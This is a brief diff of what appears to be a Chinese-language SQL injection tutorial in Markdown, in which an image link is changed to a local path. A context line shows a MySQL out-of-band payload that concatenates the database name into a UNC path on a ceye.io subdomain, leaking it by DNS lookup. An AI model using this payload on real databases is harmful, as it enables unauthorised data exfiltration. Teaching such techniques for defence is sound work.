@@ -241,7 +241,7 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 +----------------------------------------------------------------------+
 1 row in set (0.00 sec)
 ```
-![图片.png](https://upload-images.jianshu.io/upload_images/9113969-acd35de9c423b8a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+![](.php/figure/preg_match/sqli1.png)
 
 ## 参考资料
 
